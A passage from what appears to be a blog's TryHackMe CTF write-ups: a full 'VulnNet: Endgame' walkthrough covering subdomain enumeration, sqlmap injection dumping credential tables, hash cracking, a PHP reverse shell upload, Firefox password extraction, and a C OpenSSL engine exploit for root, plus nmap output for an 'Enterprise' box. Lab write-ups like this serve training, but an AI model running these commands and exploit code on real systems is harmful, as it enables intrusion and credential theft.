&lt;html class=<span class="hljs-string">&quot;no-js&quot;</span>&gt; &lt;!--&lt;![endif]--&gt;        &lt;<span class="hljs-built_in">head</span>&gt;        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;        &lt;meta http-equiv=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> content=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;        &lt;title&gt;Soon &amp;mdash; Fully Responsive Software Design by VulnNet&lt;/title&gt;        &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;        &lt;!-- Facebook and Twitter integration --&gt;        &lt;meta property=<span class="hljs-string">&quot;og:title&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>/&gt;        &lt;meta property=<span class="hljs-string">&quot;og:image&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>/&gt;        &lt;meta property=<span class="hljs-string">&quot;og:url&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>/&gt;        &lt;meta property=<span class="hljs-string">&quot;og:site_name&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>/&gt;        &lt;meta property=<span class="hljs-string">&quot;og:description&quot;</span> content=<span class="hljs-string">&quot;&quot;</span>/&gt;        &lt;meta name=<span class="hljs-string">&quot;twitter:title&quot;</span> content=<span class="hljs-string">&quot;&quot;</span> /&gt;        &lt;meta name=<span class="hljs-string">&quot;twitter:image&quot;</span> content=<span class="hljs-string">&quot;&quot;</span> /&gt;        &lt;meta name=<span class="hljs-string">&quot;twitter:url&quot;</span> content=<span class="hljs-string">&quot;&quot;</span> /&gt;        &lt;meta name=<span class="hljs-string">&quot;twitter:card&quot;</span> content=<span class="hljs-string">&quot;&quot;</span> /&gt;        &lt;!-- &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&#x27;https://fonts.googleapis.com/css?family=Work+Sans:400,300,600,400italic,700&#x27;</span> rel=<span class="hljs-string">&#x27;stylesheet&#x27;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;text/css&#x27;</span>&gt; --&gt;        &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Space+Mono&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;        &lt;!-- Animate.css --&gt;        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/animate.css&quot;</span>&gt;        &lt;!-- Icomoon Icon Fonts--&gt;        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/icomoon.css&quot;</span>&gt;        &lt;!-- Bootstrap  --&gt;        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/bootstrap.css&quot;</span>&gt;        &lt;!-- Theme style  --&gt;        &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/style.css&quot;</span>&gt;        &lt;!-- Modernizr JS --&gt;        &lt;script src=<span class="hljs-string">&quot;js/modernizr-2.6.2.min.js&quot;</span>&gt;&lt;/script&gt;        &lt;!-- FOR IE9 below --&gt;        &lt;!--[<span class="hljs-keyword">if</span> lt IE 9]&gt;        &lt;script src=<span class="hljs-string">&quot;js/respond.min.js&quot;</span>&gt;&lt;/script&gt;        &lt;![endif]--&gt;</code></pre><h2 id="Directory-Busting-with-GoBuster"><a href="#Directory-Busting-with-GoBuster" class="headerlink" title="Directory Busting with GoBuster"></a>Directory Busting with GoBuster</h2><p>Directory busting with Gobuster involves using the tool to brute-force and enumerate hidden directories and files on a web server.</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p>→ output:</p><pre><code class="hljs bash">/images               (Status: 301) [Size: 311] [--&gt; http://vulnnet.thm/images/]/css                  (Status: 301) [Size: 308] [--&gt; http://vulnnet.thm/css/]/js                   (Status: 301) [Size: 307] [--&gt; http://vulnnet.thm/js/]/fonts                (Status: 301) [Size: 310] [--&gt; http://vulnnet.thm/fonts/]</code></pre><h2 id="Subdomain-Enumeration-with-wfuzz"><a href="#Subdomain-Enumeration-with-wfuzz" class="headerlink" title="Subdomain Enumeration with wfuzz"></a>Subdomain Enumeration with wfuzz</h2><p><strong>Wfuzz</strong> was used for subdomain enumeration to identify hidden subdomains.</p><ul><li>command used:</li></ul><pre><code class="hljs bash">wfuzz -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="hljs-string">&quot;HOST: FUZZ.vulnnet.thm&quot;</span> -u http://vulnnet.thm --hw 1053</code></pre><p>Alright so the response is quite long and what i found is that the right subdomains have more than 1 line so to make the response more likeable visual we will update the command to this:</p><pre><code class="hljs bash">wfuzz -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="hljs-string">&quot;HOST: FUZZ.vulnnet.thm&quot;</span> -u http://vulnnet.thm --hl 1</code></pre><p>→ output:</p><pre><code class="hljs bash">********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://vulnnet.thm/Total requests: 114441=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                  =====================================================================000000018:   200        390 L    1599 W     19316 Ch    <span class="hljs-string">&quot;blog - blog&quot;</span>                                                                                            000000037:   200        524 L    1406 W     26701 Ch    <span class="hljs-string">&quot;shop - shop&quot;</span>                                                                                            000000051:   200        0 L      4 W        18 Ch       <span class="hljs-string">&quot;api - api&quot;</span>                                                                                              000000689:   400        10 L     35 W       301 Ch      <span class="hljs-string">&quot;gc._msdcs - gc._msdcs&quot;</span>                                                                                  000001219:   307        0 L      0 W        0 Ch        <span class="hljs-string">&quot;admin1 - admin1&quot;</span>                                                                                        000009532:   400        10 L     35 W       301 Ch      <span class="hljs-string">&quot;#www - #www&quot;</span>                                                                                            ^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...Total time: 0Processed Requests: 9880Filtered Requests: 9874Requests/sec.: 0</code></pre><p>Found 4 subdomains let’s add them to &#x2F;etc&#x2F;hosts:</p><p><img src="/../vulnnet_img/1.png" alt="alt text"></p><h3 id="shop-vulnnet-thm"><a href="#shop-vulnnet-thm" class="headerlink" title="shop.vulnnet.thm"></a>shop.vulnnet.thm</h3><p>Directory busting </p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://shop.vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p>→ Without luck</p><h3 id="blog-vulnnet-thm"><a href="#blog-vulnnet-thm" class="headerlink" title="blog.vulnnet.thm"></a>blog.vulnnet.thm</h3><p>Directory busting</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://blog.vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p>→ Found &#x2F;assets</p><pre><code class="hljs bash">/assets               (Status: 301) [Size: 321] [--&gt; http://blog.vulnnet.thm/assets/]</code></pre><h3 id="api-vulnnet-thm"><a href="#api-vulnnet-thm" class="headerlink" title="api.vulnnet.thm"></a>api.vulnnet.thm</h3><p>Directory busting</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://api.vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p>→ Nothing found</p><h3 id="admin1-vulnnet-thm"><a href="#admin1-vulnnet-thm" class="headerlink" title="admin1.vulnnet.thm"></a>admin1.vulnnet.thm</h3><p>Directory busting</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://admin1.vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p>→ Found:</p><pre><code class="hljs bash">Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode===============================================================/en                   (Status: 301) [Size: 321] [--&gt; http://admin1.vulnnet.thm/en/]/vendor               (Status: 301) [Size: 325] [--&gt; http://admin1.vulnnet.thm/vendor/]/fileadmin            (Status: 301) [Size: 328] [--&gt; http://admin1.vulnnet.thm/fileadmin/]/typo3temp            (Status: 301) [Size: 328] [--&gt; http://admin1.vulnnet.thm/typo3temp/]/typo3                (Status: 301) [Size: 324] [--&gt; http://admin1.vulnnet.thm/typo3/]</code></pre><p> <strong>&#x2F;typo3</strong></p><p><img src="/../vulnnet_img/2.png" alt="alt text"></p><p><strong>&#x2F;fileadmin</strong></p><p><img src="/../vulnnet_img/3.png" alt="alt text"></p><p><strong>&#x2F;vendor</strong></p><p><img src="/../vulnnet_img/4.png" alt="alt text"></p><p>Didn’t find anything here.</p><h1 id="Exploitation-—-SQL-Injection"><a href="#Exploitation-—-SQL-Injection" class="headerlink" title="Exploitation — SQL Injection"></a><strong>Exploitation — SQL Injection</strong></h1><p>If we go on blog.vulnnet.thm and access a blog we see a interesting request from <code>api.vulnnet.thm</code> </p><p><img src="/../vulnnet_img/5.png" alt="alt text"></p><p>→ output</p><p><img src="/../vulnnet_img/6.png" alt="alt text"></p><p>We can see in the URL we have a parameter blog &#x3D; 1 , let’s try sqlmap</p><p>SQL injection testing with SQLmap involves using the tool to automatically detect and exploit SQL injection vulnerabilities in web applications.</p><ul><li>command used:</li></ul><pre><code class="hljs bash">sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -p blog --dbs</code></pre><p>→ output:</p><pre><code class="hljs bash">[08:48:49] [INFO] fetching database namesavailable databases [3]:[*] blog[*] information_schema[*] vn_admin</code></pre><p><strong>Let’s see tables</strong></p><pre><code class="hljs bash">sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -p blog -D vn_admin --tables</code></pre><p>→</p><pre><code class="hljs bash">backend_layout                              || be_dashboards                               || be_groups                                   || be_sessions                                 || be_users                                    || cache_adminpanel_requestcache               || cache_adminpanel_requestcache_tags          || cache_hash                                  || cache_hash_tags                             || cache_imagesizes                            || cache_imagesizes_tags                       || cache_pages                                 || cache_pages_tags                            || cache_pagesection                           || cache_pagesection_tags                      || cache_rootline                              || cache_rootline_tags                         || cache_treelist                              || fe_groups                                   || fe_sessions                                 || fe_users                                    || pages                                       || sys_be_shortcuts                            || sys_category                                || sys_category_record_mm                      || sys_collection                              || sys_collection_entries                      || sys_file                                    || sys_file_collection                         || sys_file_metadata                           || sys_file_processedfile                      || sys_file_reference                          || sys_file_storage                            || sys_filemounts                              || sys_history                                 || sys_language                                || sys_lockedrecords                           || sys_log                                     || sys_news                                    || sys_note                                    || sys_redirect                                || sys_refindex                                || sys_registry                                || sys_template                                || tt_content                                  || tx_extensionmanager_domain_model_extension  || tx_extensionmanager_domain_model_repository || tx_impexp_presets</code></pre><p>Now check the columns:</p><pre><code class="hljs bash">└─$ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -p blog -D vn_admin -T be_users --columns</code></pre><p>→</p><pre><code class="hljs bash">+-----------------------+----------------------+| Column                | Type                 |+-----------------------+----------------------+| admin                 | smallint(5) unsigned || description           | text                 || <span class="hljs-built_in">disable</span>               | smallint(5) unsigned || options               | smallint(5) unsigned || allowed_languages     | varchar(255)         || avatar                | int(10) unsigned     || category_perms        | text                 || crdate                | int(10) unsigned     || createdByAction       | int(11)              || cruser_id             | int(10) unsigned     || db_mountpoints        | text                 || deleted               | smallint(5) unsigned || disableIPlock         | smallint(5) unsigned || email                 | varchar(255)         || endtime               | int(10) unsigned     || file_mountpoints      | text                 || file_permissions      | text                 || lang                  | varchar(6)           || lastlogin             | int(10) unsigned     || lockToDomain          | varchar(50)          || password              | varchar(100)         || pid                   | int(10) unsigned     || realName              | varchar(80)          || starttime             | int(10) unsigned     || TSconfig              | text                 || tstamp                | int(10) unsigned     || uc                    | mediumblob           || uid                   | int(10) unsigned     || usergroup             | varchar(255)         || usergroup_cached_list | text                 || userMods              | text                 || username              | varchar(50)          || workspace_id          | int(11)              || workspace_perms       | smallint(6)          |+-----------------------+----------------------+</code></pre><p>Dump the cred and let’s check them:</p><pre><code class="hljs bash">─$ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 -p blog -D vn_admin -T be_users --columns -C username,password --dump</code></pre><p><img src="/../vulnnet_img/7.png" alt="alt text"></p><p>CREDS:</p><pre><code class="hljs bash">username,passwordchris_w, $argon2i<span class="hljs-variable">$v</span>=19<span class="hljs-variable">$m</span>=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg<span class="hljs-variable">$j6z3IshmjsN</span>+CwhciRECV2NArQwipqQMIBtYufyM4Rg</code></pre><p>Tried cracking with john, while waiting let’s dump the blog’s database:</p><pre><code class="hljs bash">sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D blog --tables</code></pre><p><img src="/../vulnnet_img/8.png" alt="alt text"></p><p><strong>Selecting the users table</strong></p><pre><code class="hljs bash">sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 —batch -D blog -T <span class="hljs-built_in">users</span> —-columns</code></pre><p><img src="/../vulnnet_img/9.png" alt="alt text"></p><p><strong>Dumping the entire username and password column of the user table</strong></p><ul><li>command used:</li></ul><pre><code class="hljs bash">sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D blog -T <span class="hljs-built_in">users</span> -C username,password --dump</code></pre><p>→ </p><p><img src="/../vulnnet_img/10.png" alt="alt text"></p><p>Extract the passwords :</p><pre><code class="hljs bash">grep -v <span class="hljs-string">&#x27;^username&#x27;</span> /home/kali/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;,&#x27;</span> -f2 &gt; passwords.txt</code></pre><p>Crack chris_w password’s hash with <code>john</code></p><p>John the Ripper is used in a penetration test to crack password hashes and identify weak or compromised passwords.</p><ul><li>command used:</li></ul><pre><code class="hljs bash">─$ john chris_w.hash --wordlist=passwords.txt</code></pre><p>→ </p><p><img src="/../vulnnet_img/11.png" alt="alt text"></p><p>Pass: vAxWtmNzeTz</p><p>Now we have chris_w’s password, we can login the CMS.</p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>I tried to upload a php-reverse-shell but it didn’t work because the extension .php is to allowed:</p><p><img src="/../vulnnet_img/12.png" alt="alt text"></p><p>But since we have admin privileges let’s change that :</p><p>Admin TOOLS → Settings → Configure Installation- Wide options → File deny → Delete</p><p>Now upload the php reverse shell configured with your ip and start a netcat:</p><p><img src="/../vulnnet_img/13.png" alt="alt text"></p><p>Head into &#x2F;fileadmin&#x2F;php-reverse-shell and we got shell:</p><p><img src="/../vulnnet_img/14.png" alt="alt text"></p><p>→ output: </p><p><img src="/../vulnnet_img/15.png" alt="alt text"></p><p>→</p><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> /home/system$ <span class="hljs-built_in">ls</span> -latotal 92drwxr-xr-x 18 system system 4096 Jun 15  2022 .drwxr-xr-x  3 root   root   4096 Jun 14  2022 ..-rw-------  1 system system 2124 Jun 15  2022 .ICEauthoritylrwxrwxrwx  1 root   root      9 Jun 14  2022 .bash_history -&gt; /dev/null-rw-r--r--  1 system system  220 Jun 14  2022 .bash_logout-rw-r--r--  1 system system 3771 Jun 14  2022 .bashrcdrwx------ 16 system system 4096 Jun 14  2022 .cachedrwx------ 14 system system 4096 Jun 14  2022 .configdrwx------  3 root   root   4096 Jun 14  2022 .dbusdrwx------  3 system system 4096 Jun 14  2022 .gnupgdrwx------  2 root   root   4096 Jun 14  2022 .gvfsdrwx------  3 system system 4096 Jun 14  2022 .<span class="hljs-built_in">local</span>drwxr-xr-x  4 system system 4096 Jun 14  2022 .mozillalrwxrwxrwx  1 root   root      9 Jun 14  2022 .mysql_history -&gt; /dev/null-rw-r--r--  1 system system  807 Jun 14  2022 .profile-rw-r--r--  1 system system    0 Jun 14  2022 .sudo_as_admin_successfuldrwxr-xr-x  2 system system 4096 Jun 14  2022 Desktopdrwxr-xr-x  2 system system 4096 Jun 14  2022 Documentsdrwxr-xr-x  2 system system 4096 Jun 14  2022 Downloadsdrwxr-xr-x  2 system system 4096 Jun 14  2022 Musicdrwxr-xr-x  2 system system 4096 Jun 14  2022 Picturesdrwxr-xr-x  2 system system 4096 Jun 14  2022 Publicdrwxr-xr-x  2 system system 4096 Jun 14  2022 Templatesdr-xr-x---  2 system system 4096 Jun 14  2022 Utilsdrwxr-xr-x  2 system system 4096 Jun 14  2022 Videos-rw-------  1 system system   38 Jun 14  2022 user.txt</code></pre><p>Checking the user system home directory, there’s a mozilla folder.</p><p>In Linux the main Firefox profile folder that stores personal data is in the hidden “~&#x2F;.mozilla&#x2F;firefox&#x2F;” folder.</p><h2 id="Extracting-the-credentials"><a href="#Extracting-the-credentials" class="headerlink" title="Extracting the credentials"></a>Extracting the credentials</h2><p>Zip the entire mozilla directory</p><ul><li>command used:</li></ul><pre><code class="hljs bash">zip /tmp/system-mozilla.zip .mozilla -r</code></pre><p>Start a python3 server on the attacked machine :</p><pre><code class="hljs bash">$ python3 -m http.server 8081</code></pre><p>Get the file with wget:</p><pre><code class="hljs bash">└─$ wget http://10.10.225.111:8081/system-mozilla.zip--2024-07-23 10:10:22--  http://10.10.225.111:8081/system-mozilla.zipConnecting to 10.10.225.111:8081... connected.HTTP request sent, awaiting response... 200 OKLength: 8079868 (7.7M) [application/zip]Saving to: ‘system-mozilla.zip’system-mozilla.zip                           100%[==============================================================================================&gt;]   7.71M  8.86MB/s    <span class="hljs-keyword">in</span> 0.9s    2024-07-23 10:10:23 (8.86 MB/s) - ‘system-mozilla.zip’ saved [8079868/8079868]</code></pre><p>None of the user profiles had login except “2fjnrwth.default-release”</p><p><img src="/../vulnnet_img/16.png" alt="alt text"></p><p>Now checking the profile.ini file, it does not have the “2fjnrwth.default-release” profile as shown below.</p><p>Change one of them to “2fjnrwth.default-release” </p><p><img src="/../vulnnet_img/17.png" alt="alt text"></p><p> Extract the credentials with firefox_decryptor tool</p><p>→ Run the exploit</p><pre><code class="hljs bash">└─$ python3 firefox_decrypt/firefox_decrypt.py .mozilla/firefox</code></pre><p><img src="/../vulnnet_img/18.png" alt="alt text"></p><p>CREDS:</p><p>Website:   <a href="https://tryhackme.com/">https://tryhackme.com</a><br>Username: ‘<a href="mailto:&#x63;&#104;&#x72;&#105;&#115;&#x5f;&#x77;&#x40;&#118;&#x75;&#x6c;&#x6e;&#x6e;&#x65;&#116;&#46;&#x74;&#104;&#109;">&#x63;&#104;&#x72;&#105;&#115;&#x5f;&#x77;&#x40;&#118;&#x75;&#x6c;&#x6e;&#x6e;&#x65;&#116;&#46;&#x74;&#104;&#109;</a>‘<br>Password: ‘8y7TKQDpucKBYhwsb’</p><h2 id="SSH-system-user"><a href="#SSH-system-user" class="headerlink" title="SSH system user"></a>SSH system user</h2><p>Logging in with SSH as a system user involves securely accessing a remote system by using the SSH (Secure Shell) protocol and providing the system user’s credentials.</p><p>Log in with ssh with the credentials we just found</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ ssh system@10.10.225.111</code></pre><p>→</p><p><img src="/../vulnnet_img/19.png" alt="alt text"></p><h3 id="Uploading-LinPEAS"><a href="#Uploading-LinPEAS" class="headerlink" title="Uploading LinPEAS"></a>Uploading LinPEAS</h3><p><strong>LinPEAS</strong> is a script used in penetration testing to automate the process of enumerating possible paths to escalate privileges on a Linux system.</p><p>Start a python3 http.server on your machine and download linpeas in the attacked machine with wget or curl:</p><ul><li>command used:</li></ul><pre><code class="hljs bash">wget http://10.9.2.254:8000/linpeas.sh</code></pre><p>Change execute permissions to linpeas and run it:</p><pre><code class="hljs bash">system@vulnnet-endgame:/tmp$ <span class="hljs-built_in">chmod</span> +x linpeas.shsystem@vulnnet-endgame:/tmp$ ./linpeas.sh</code></pre><p>Linpeas found we have cap_setuid capability and library load feature in OpenSSL</p><p><img src="/../vulnnet_img/20.png" alt="alt text"></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>To exploit this, create an ‘exploit.c’ file with this content:</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/engine.h&gt;</span></span><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(ENGINE *e, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *id)</span>&#123;  setuid(<span class="hljs-number">0</span>); setgid(<span class="hljs-number">0</span>);  system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);&#125;IMPLEMENT_DYNAMIC_BIND_FN(bind)IMPLEMENT_DYNAMIC_CHECK_FN()</code></pre><p>Run the following:</p><pre><code class="hljs c">gcc -fPIC -o exploit.o -c exploit.cgcc -shared -o exploit.so -lcrypto exploit.o</code></pre><p>→</p><p><img src="/../vulnnet_img/21.png" alt="alt text"></p><p>Upload the <a href="http://exploit.so/">exploit.so</a> to the attacked machine:</p><pre><code class="hljs c">wget http:<span class="hljs-comment">//10.9.2.254:8000/exploit.so</span></code></pre><p>→</p><p><img src="/../vulnnet_img/22.png" alt="alt text"></p><pre><code class="hljs c">chmod +x exploit.so</code></pre><p>Run the exploit and get root:</p><pre><code class="hljs c">/home/system/Utils/openssl req -engine ./exploit.so</code></pre><p><img src="/../vulnnet_img/23.png" alt="alt text"></p><pre><code class="hljs c">root@vulnnet-endgame:~<span class="hljs-meta"># cat user.txt</span>THM&#123;fb84e79072015186c72ec77ded49a5ff&#125;</code></pre><pre><code class="hljs c">root@vulnnet-endgame:/root/thm-flag<span class="hljs-meta"># cat root.txt </span>THM&#123;<span class="hljs-number">1</span>d42edbb03c0b287a8d0d8a265dce012&#125;</code></pre><p>Pass of the CMS: <code>vAxWtmNzeTz</code></p><p>User flag: <strong><code>THM&#123;fb84e79072015186c72ec77ded49a5ff&#125;</code></strong></p><p>Root flag: <strong><code>THM&#123;1d42edbb03c0b287a8d0d8a265dce012&#125;</code></strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Enterprise</title>
      <link href="/2024/07/25/Enterprise/"/>
      <url>/2024/07/25/Enterprise/</url>
      
        <content type="html"><![CDATA[<p><img src="/../enterprise_img/17a909f942e200104874be3a95802e21.png" alt="alt text"></p><p><strong>Target IP Address: 10.10.139.38</strong></p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h2><p>Nmap scans network ports to determine their status (open, closed, or filtered), identifies services running on them, and detects their versions.</p><ul><li>command used:(scanning all ports fast and efficient)</li></ul><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.32.71</code></pre><p>→ output:</p><pre><code class="hljs bash">PORT      STATE SERVICE        REASON53/tcp    open  domain         syn-ack ttl 12780/tcp    open  http           syn-ack ttl 12788/tcp    open  kerberos-sec   syn-ack ttl 127135/tcp   open  msrpc          syn-ack ttl 127139/tcp   open  netbios-ssn    syn-ack ttl 127389/tcp   open  ldap           syn-ack ttl 127445/tcp   open  microsoft-ds   syn-ack ttl 127464/tcp   open  kpasswd5       syn-ack ttl 127593/tcp   open  http-rpc-epmap syn-ack ttl 127636/tcp   open  ldapssl        syn-ack ttl 1273389/tcp  open  ms-wbt-server  syn-ack ttl 1275357/tcp  open  wsdapi         syn-ack ttl 1275985/tcp  open  wsman          syn-ack ttl 1277990/tcp  open  unknown        syn-ack ttl 1279389/tcp  open  adws           syn-ack ttl 12747001/tcp open  winrm          syn-ack ttl 12749664/tcp open  unknown        syn-ack ttl 12749665/tcp open  unknown        syn-ack ttl 12749666/tcp open  unknown        syn-ack ttl 12749668/tcp open  unknown        syn-ack ttl 12749669/tcp open  unknown        syn-ack ttl 12749672/tcp open  unknown        syn-ack ttl 12749675/tcp open  unknown        syn-ack ttl 12749676/tcp open  unknown        syn-ack ttl 12749679/tcp open  unknown        syn-ack ttl 12749706/tcp open  unknown        syn-ack ttl 127</code></pre><h2 id="NMAP-Full-Scanning"><a href="#NMAP-Full-Scanning" class="headerlink" title="NMAP Full Scanning"></a>NMAP Full Scanning</h2><p>Now we will scan the ports we got previously</p><ul><li>command used:(scanning the ports we got)</li></ul><pre><code class="hljs bash">└─$ nmap -A -sC -sV -p53,80,88,135,139,389,445,464,593,636,3389,5357,5985,7990,9389,47001,49664,49665,49666,49668,49669,49672,49675,49676,49679,49706 10.10.32.71 -Pn</code></pre><p>→ output:</p><pre><code class="hljs bash">PORT      STATE SERVICE       VERSION53/tcp    open  domain        Simple DNS Plus80/tcp    open  http          Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><span class="hljs-string">|_http-server-header: Microsoft-IIS/10.0</span><span class="hljs-string">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-24 07:04:37Z)</span><span class="hljs-string">135/tcp   open  msrpc         Microsoft Windows RPC</span><span class="hljs-string">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><span class="hljs-string">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span><span class="hljs-string">445/tcp   open  microsoft-ds?</span><span class="hljs-string">464/tcp   open  kpasswd5?</span><span class="hljs-string">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><span class="hljs-string">636/tcp   open  tcpwrapped</span><span class="hljs-string">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><span class="hljs-string">|_ssl-date: 2024-07-24T07:05:42+00:00; 0s from scanner time.</span><span class="hljs-string">| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM</span><span class="hljs-string">| Not valid before: 2024-07-23T06:57:41</span><span class="hljs-string">|_Not valid after:  2025-01-22T06:57:41</span><span class="hljs-string">| rdp-ntlm-info: </span><span class="hljs-string">|   Target_Name: LAB-ENTERPRISE</span><span class="hljs-string">|   NetBIOS_Domain_Name: LAB-ENTERPRISE</span><span class="hljs-string">|   NetBIOS_Computer_Name: LAB-DC</span><span class="hljs-string">|   DNS_Domain_Name: LAB.ENTERPRISE.THM</span><span class="hljs-string">|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM</span><span class="hljs-string">|   DNS_Tree_Name: ENTERPRISE.THM</span><span class="hljs-string">|   Product_Version: 10.0.17763</span><span class="hljs-string">|_  System_Time: 2024-07-24T07:05:33+00:00</span><span class="hljs-string">5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><span class="hljs-string">|_http-title: Service Unavailable</span><span class="hljs-string">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><span class="hljs-string">|_http-title: Not Found</span><span class="hljs-string">7990/tcp  open  http          Microsoft IIS httpd 10.0</span><span class="hljs-string">| http-methods: </span><span class="hljs-string">|_  Potentially risky methods: TRACE</span><span class="hljs-string">|_http-server-header: Microsoft-IIS/10.0</span><span class="hljs-string">|_http-title: Log in to continue - Log in with Atlassian account</span><span class="hljs-string">9389/tcp  open  mc-nmf        .NET Message Framing</span><span class="hljs-string">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><span class="hljs-string">|_http-title: Not Found</span><span class="hljs-string">49664/tcp open  msrpc         Microsoft Windows RPC</span><span class="hljs-string">49665/tcp open  msrpc         Microsoft Windows RPC</span><span class="hljs-string">49666/tcp open  msrpc         Microsoft Windows RPC</span><span class="hljs-string">49668/tcp open  msrpc         Microsoft Windows RPC</span><span class="hljs-string">49669/tcp open  msrpc         Microsoft Windows RPC</span><span class="hljs-string">49672/tcp open  msrpc         Microsoft Windows RPC</span><span class="hljs-string">49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><span class="hljs-string">49676/tcp open  msrpc         Microsoft Windows RPC</span><span class="hljs-string">49679/tcp open  msrpc         Microsoft Windows RPC</span><span class="hljs-string">49706/tcp open  msrpc         Microsoft Windows RPC</span><span class="hljs-string">Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><span class="hljs-string"></span><span class="hljs-string">Host script results:</span><span class="hljs-string">| smb2-security-mode: </span><span class="hljs-string">|   3:1:1: </span><span class="hljs-string">|_    Message signing enabled and required</span><span class="hljs-string">| smb2-time: </span><span class="hljs-string">|   date: 2024-07-24T07:05:34</span><span class="hljs-string">|_  start_date: N/A</span><span class="hljs-string"></span><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 72.92 seconds</span><span class="hljs-string">                                                                </span></code></pre><h2 id="Services"><a href="#Services" 